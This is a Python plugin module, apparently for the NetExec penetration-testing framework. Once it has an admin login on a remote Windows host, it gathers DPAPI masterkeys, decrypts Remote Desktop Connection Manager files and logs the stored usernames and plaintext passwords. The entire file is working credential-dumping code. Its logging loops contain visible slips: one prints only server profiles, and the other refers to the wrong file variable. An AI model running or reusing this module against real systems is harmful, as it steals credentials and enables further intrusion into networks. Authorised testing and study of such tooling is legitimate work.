from dploot.triage.rdg import RDGTriage, RDGServerProfile

from nxc.helpers.logger import highlight
from nxc.helpers.misc import CATEGORY


class NXCModule:
    name = "rdcman"
    description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
    supported_protocols = ["smb","wmi","winrm","mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        self.masterkeys = connection.dpapi_triage.collect_masterkeys_from_target(dump_users=True, dump_system=False)

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success("Looting RDCMan secrets")

        try:
            triage = RDGTriage(target=connection.dpapi_triage.target, conn=connection.dpapi_triage.conn, masterkeys=self.masterkeys)
            rdcman_files, rdgfiles = triage.triage_rdcman()
            for rdcman_file in rdcman_files:
                if rdcman_file is None:
                    continue
                for rdg_cred in rdcman_file.rdg_creds:
                    log_text = f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                    if isinstance(rdg_cred, RDGServerProfile):
                        log_text = f"{rdg_cred.server_name} - {log_text}"
                        context.log.highlight(f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}")
            for rdgfile in rdgfiles:
                if rdgfile is None:
                    continue
                for rdg_cred in rdgfile.rdg_creds:
                    log_text = f"{rdg_cred.username}:{rdg_cred.password.decode('latin-1')}"
                    if isinstance(rdg_cred, RDGServerProfile):
                        log_text = f"{rdg_cred.server_name} - {log_text}"
                    context.log.highlight(f"[{rdcman_file.winuser}][{rdg_cred.profile_name}] {log_text}")
        except Exception as e:
            context.log.debug(f"Could not loot RDCMan secrets: {e}")
